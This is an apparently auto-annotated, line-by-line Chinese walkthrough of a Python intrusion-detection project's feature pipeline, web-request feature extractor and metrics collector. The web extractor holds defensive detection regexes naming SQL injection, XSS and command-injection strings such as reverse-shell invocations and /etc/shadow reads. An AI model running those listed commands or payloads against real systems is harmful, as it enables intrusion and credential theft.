| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n_rows = len(df)` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 数值列 ----` |
| 129 | 条件判断：满足条件时进入对应分支。 | `        if self.numeric_columns:` |
| 130 | 注释：解释下面或当前这段代码的设计意图。 | `            # 缺失列用 0 填充,缺失单元格(NaN)同样填 0,保证在线推理鲁棒` |
| 131 | 循环：逐个处理集合或迭代器中的元素。 | `            for col in self.numeric_columns:` |
| 132 | 条件判断：满足条件时进入对应分支。 | `                if col not in df.columns:` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    df[col] = 0` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            df[self.numeric_columns] = df[self.numeric_columns].fillna(0)` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            numeric_vals = self.scaler.transform(` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `                df[self.numeric_columns].values.astype(np.float64)` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 138 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            numeric_vals = np.empty((n_rows, 0), dtype=np.float64)` |
| 140 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 141 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 类别列 ----` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cat_cols_encoded: List[np.ndarray] = []` |
| 143 | 循环：逐个处理集合或迭代器中的元素。 | `        for col in self.categorical_columns:` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            le = self.label_encoders.get(col)` |
| 145 | 条件判断：满足条件时进入对应分支。 | `            if le is None:` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `                cat_cols_encoded.append(` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    np.full((n_rows, 1), self.UNKNOWN_CATEGORY_CODE, dtype=np.float64)` |
| 148 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 149 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 条件判断：满足条件时进入对应分支。 | `            if col not in df.columns:` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `                cat_cols_encoded.append(` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    np.full((n_rows, 1), self.UNKNOWN_CATEGORY_CODE, dtype=np.float64)` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 155 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            known_classes = set(le.classes_.tolist())` |
| 158 | 注释：解释下面或当前这段代码的设计意图。 | `            # NaN -> 空串,再统一转为字符串` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            series = df[col].fillna('').astype(str)` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            encoded = np.empty(n_rows, dtype=np.float64)` |
| 162 | 循环：逐个处理集合或迭代器中的元素。 | `            for i, val in enumerate(series.values):` |
| 163 | 条件判断：满足条件时进入对应分支。 | `                if val in known_classes:` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    encoded[i] = int(le.transform([val])[0])` |
| 165 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 166 | 注释：解释下面或当前这段代码的设计意图。 | `                    # 【安全】未见过的类别 -> -1,不抛异常` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    encoded[i] = self.UNKNOWN_CATEGORY_CODE` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `            cat_cols_encoded.append(encoded.reshape(-1, 1))` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 拼接 ----` |
| 171 | 条件判断：满足条件时进入对应分支。 | `        if cat_cols_encoded:` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cat_array = np.hstack(cat_cols_encoded)` |
| 173 | 返回结果：把处理后的值交回调用方。 | `            return np.hstack([numeric_vals, cat_array])` |
| 174 | 返回结果：把处理后的值交回调用方。 | `        return numeric_vals` |
| 175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 176 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---------- 持久化 ----------` |
| 177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 178 | 函数定义：声明 `save` 的输入、处理逻辑和返回结果。 | `    def save(self, path: str) -> None:` |
| 179 | 文档字符串：说明当前模块、类或函数的职责。 | `        """用 joblib 将整个流水线对象保存到磁盘。"""` |
| 180 | 函数调用：执行已有函数/方法完成当前步骤。 | `        joblib.dump(self, path)` |
| 181 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[FeaturePipeline] 已保存至 %s", path)` |
| 182 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 183 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 184 | 函数定义：声明 `load` 的输入、处理逻辑和返回结果。 | `    def load(path: str) -> "FeaturePipeline":` |
| 185 | 文档字符串：说明当前模块、类或函数的职责。 | `        """加载已保存的流水线对象。"""` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipeline: FeaturePipeline = joblib.load(path)` |
| 187 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[FeaturePipeline] 已从 %s 加载", path)` |
| 188 | 返回结果：把处理后的值交回调用方。 | `        return pipeline` |

## `src/features/web_features.py`

- 类型：特征工程
- 行数：164

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Web 请求特征提取器` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §4.2.2 Web 请求特征` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `【安全修复】必须多层 URL 解码 + 所有正则匹配都在解码后的 URL 上执行，` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `           防止攻击者通过 \`\`%253C -> %3C -> <\`\` 多层编码链绕过检测。` |
| 7 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 8 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Pattern` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from urllib.parse import unquote` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 类定义：声明 `WebFeatureExtractor`，封装相关状态与行为。 | `class WebFeatureExtractor:` |
| 19 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    HTTP 请求特征提取器。` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    输出用于下游:` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `        - Web 攻击规则/ML 引擎(SQL 注入 / XSS / 命令注入);` |
| 24 | 函数调用：执行已有函数/方法完成当前步骤。 | `        - 异常检测(基于长度、参数数量、特殊字符比例);` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - 安全审计日志。` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `    所有正则均预编译且使用 \`\`re.IGNORECASE\`\`,以加速批量处理。` |
| 28 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 注释：解释下面或当前这段代码的设计意图。 | `    # ===== 预编译正则:SQL 注入关键字 =====` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SQL_KEYWORDS: Pattern[str] = re.compile(` |
| 32 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"(union\s+select\|select\s+.+\s+from\|insert\s+into\|update\s+.+\s+set\|"` |
| 33 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"delete\s+from\|drop\s+(table\|database)\|alter\s+table\|exec(ute)?\s*\(\|"` |
| 34 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"xp_cmdshell\|information_schema\|0x[0-9a-f]+\|char\s*\(\|concat\s*\(\|"` |
| 35 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"sleep\s*\(\|benchmark\s*\(\|waitfor\s+delay\|load_file\s*\(\|"` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        r"\bor\s+1\s*=\s*1\b\|\band\s+1\s*=\s*1\b\|'\s*or\s*')",` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `        re.IGNORECASE,` |
| 38 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 注释：解释下面或当前这段代码的设计意图。 | `    # ===== 预编译正则:XSS 关键字 =====` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    XSS_KEYWORDS: Pattern[str] = re.compile(` |
| 42 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"(<\s*script\b\|</\s*script\s*>\|javascript\s*:\|vbscript\s*:\|"` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"on(error\|load\|click\|mouseover\|focus\|submit\|toggle\|start)\s*=\|"` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"alert\s*\(\|prompt\s*\(\|confirm\s*\(\|eval\s*\(\|"` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"document\.(cookie\|domain\|write\|location)\|window\.(location\|open)\|"` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `        r"<\s*iframe\b\|<\s*svg\b\|<\s*img\b[^>]*onerror)",` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `        re.IGNORECASE,` |
| 48 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 注释：解释下面或当前这段代码的设计意图。 | `    # ===== 预编译正则:命令注入关键字 =====` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    CMD_KEYWORDS: Pattern[str] = re.compile(` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"(;\s*(cat\|ls\|id\|whoami\|uname\|pwd\|wget\|curl\|nc\|ncat\|bash\|sh\|python\|perl\|ping)\b\|"` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"\\|\s*(cat\|ls\|id\|whoami\|nc\|wget\|curl\|bash\|sh)\b\|"` |
| 54 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"&&\s*(cat\|ls\|id\|whoami\|wget\|curl)\b\|"` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"\$\([^)]+\)\|\`[^\`]+\`\|"` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r"/etc/(passwd\|shadow\|hosts)\|/proc/self\|/bin/(bash\|sh)\|"` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `        r"\bbash\s+-i\b\|\bnc\s+-e\b\|reverse.*shell)",` |
| 58 | 代码语句：参与当前文件的业务流程或数据处理。 | `        re.IGNORECASE,` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 注释：解释下面或当前这段代码的设计意图。 | `    # ===== 预编译正则:特殊字符 =====` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SPECIAL_CHARS: Pattern[str] = re.compile(r"[?'\"<>;\|&\`$\\{}\[\]()]")` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 注释：解释下面或当前这段代码的设计意图。 | `    # 【安全修复】URL 最大解码层数,防止无限循环` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    MAX_DECODE_LAYERS: int = 5` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 68 | 函数定义：声明 `_decode_url` 的输入、处理逻辑和返回结果。 | `    def _decode_url(url: str) -> str:` |
| 69 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `        【安全修复】多层 URL 解码(最多 5 层)。` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        攻击者可能使用多层编码绕过检测:` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `            \`\`%25253C -> %253C -> %3C -> <\`\`` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `        本方法循环调用 \`\`urllib.parse.unquote\`\` 直到:` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `            1. 连续两次解码结果相同(已完全解码);或` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `            2. 达到最大层数(防止构造超长编码链耗尽资源)。` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `        所有解码异常被静默吞掉,返回当前已解码的内容,` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `        避免单个畸形 URL 导致整个检测流水线崩溃。` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            url: 原始 URL 字符串,可能经过 0-N 层 URL 编码。` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `            完全解码后的 URL 字符串。` |
| 87 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 88 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(url, str):` |
| 89 | 返回结果：把处理后的值交回调用方。 | `            return ''` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        decoded: str = url` |
| 92 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(WebFeatureExtractor.MAX_DECODE_LAYERS):` |
| 93 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                new_decoded = unquote(decoded)` |
| 95 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # pragma: no cover - unquote 基本不抛异常` |
| 96 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[WebFeatureExtractor] URL 解码异常: %s", exc)` |
| 97 | 跳出循环：提前结束当前循环。 | `                break` |
| 98 | 条件判断：满足条件时进入对应分支。 | `            if new_decoded == decoded:` |
| 99 | 跳出循环：提前结束当前循环。 | `                break` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            decoded = new_decoded` |
| 101 | 返回结果：把处理后的值交回调用方。 | `        return decoded` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 函数定义：声明 `extract` 的输入、处理逻辑和返回结果。 | `    def extract(self, log_entry: dict) -> dict:` |
| 104 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `        从 HTTP 日志条目中提取安全相关特征。` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_entry: 日志字典,通常包含:` |
| 109 | 代码语句：参与当前文件的业务流程或数据处理。 | `                url、http_method 或 method、status_code、response_size、` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `                src_ip、user_agent、timestamp。` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `            特征字典；含 \`\`web_request_v1\`\` 契约块(含 src_ip 等)与顶层 \`\`src_ip\`\`,` |
| 114 | 代码语句：参与当前文件的业务流程或数据处理。 | `            供检测器/融合/响应/审计链路直接使用。` |
| 115 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url: str = str(log_entry.get('url', '') or '')` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        method_raw = log_entry.get('http_method', log_entry.get('method', 'GET'))` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        method: str = str(method_raw or 'GET').upper()` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip: str = str(log_entry.get('src_ip', '') or '').strip()` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        user_agent: str = str(log_entry.get('user_agent', '') or '')` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts_val = log_entry.get('timestamp')` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_timestamp: str = '' if ts_val is None else str(ts_val)` |
| 123 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 124 | 注释：解释下面或当前这段代码的设计意图。 | `        # 【安全修复】所有关键字匹配必须基于解码后的 URL,防止编码绕过` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        decoded_url: str = self._decode_url(url)` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 注释：解释下面或当前这段代码的设计意图。 | `        # 参数数量: & 或 ; 分隔 +1(至少 1 个)` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        param_count: int = url.count('&') + url.count(';') + (1 if '?' in url else 0)` |
| 129 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status_code = int(log_entry.get('status_code', 200) or 0)` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        response_size = int(log_entry.get('response_size', 0) or 0)` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        web_request_v1: dict = {` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'schema': 'web_request_v1',` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': src_ip,` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': url,` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'method': method,` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': status_code,` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': response_size,` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'user_agent': user_agent,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'timestamp': log_timestamp,` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features: dict = {` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url_length': len(url),` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'decoded_url_length': len(decoded_url),` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': method,` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'param_count': int(param_count),` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': status_code,` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': response_size,` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': src_ip,` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'user_agent': user_agent,` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'log_timestamp': log_timestamp,` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'web_request_v1': web_request_v1,` |
| 155 | 注释：解释下面或当前这段代码的设计意图。 | `            # 【安全修复】以下统计必须作用在 decoded_url 上` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'special_char_count': len(self.SPECIAL_CHARS.findall(decoded_url)),` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'sql_keyword_count': len(self.SQL_KEYWORDS.findall(decoded_url)),` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'xss_keyword_count': len(self.XSS_KEYWORDS.findall(decoded_url)),` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'cmd_keyword_count': len(self.CMD_KEYWORDS.findall(decoded_url)),` |
| 160 | 注释：解释下面或当前这段代码的设计意图。 | `            # 原始与解码后 URL,供下游规则引擎/ML 模型二次使用` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url_raw': url,` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url_decoded': decoded_url,` |
| 163 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 164 | 返回结果：把处理后的值交回调用方。 | `        return features` |

## `src/observability/__init__.py`

- 类型：可观测性
- 行数：14

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""运维可观测：Guardian 指标采集与 Prometheus 文本辅助。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入对象：从指定模块引入类、函数或常量。 | `from src.observability.guardian_metrics import (` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    GUARDIAN_METRICS_REDIS_KEY,` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    GuardianMetricsCollector,` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    read_guardian_redis_snapshot,` |
| 8 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = [` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "GUARDIAN_METRICS_REDIS_KEY",` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "GuardianMetricsCollector",` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "read_guardian_redis_snapshot",` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |

## `src/observability/guardian_metrics.py`

- 类型：可观测性
- 行数：171

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Guardian 运行时指标：线程安全采集、可选写入 Redis（采集失败不影响主链路）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `GUARDIAN_METRICS_REDIS_KEY: str = "guardian:metrics:snapshot"` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 17 | 类定义：声明 `_AggCounterSnapshot`，封装相关状态与行为。 | `class _AggCounterSnapshot:` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    malformed: int = 0` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    single_discarded: int = 0` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    partial_discarded: int = 0` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 类定义：声明 `GuardianMetricsCollector`，封装相关状态与行为。 | `class GuardianMetricsCollector:` |
| 24 | 文档字符串：说明当前模块、类或函数的职责。 | `    """进程内计数 + 周期性刷入 Redis HASH，供 Web /metrics 聚合。"""` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._lock = threading.Lock()` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._packets_total: int = 0` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._packets_dropped: int = 0` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._latency_sum_ms: float = 0.0` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._latency_count: int = 0` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._alerts_total: int = 0` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._model_ready_gauge: int = 0` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_detection_ts: float = 0.0` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._collection_packet: bool = False` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._collection_web: bool = False` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._redis_stream_writes_ok: int = 0` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._redis_stream_writes_fail: int = 0` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_flush_ts: float = 0.0` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._prev_agg = _AggCounterSnapshot()` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `record_packets_seen` 的输入、处理逻辑和返回结果。 | `    def record_packets_seen(self, n: int) -> None:` |
| 43 | 条件判断：满足条件时进入对应分支。 | `        if n <= 0:` |
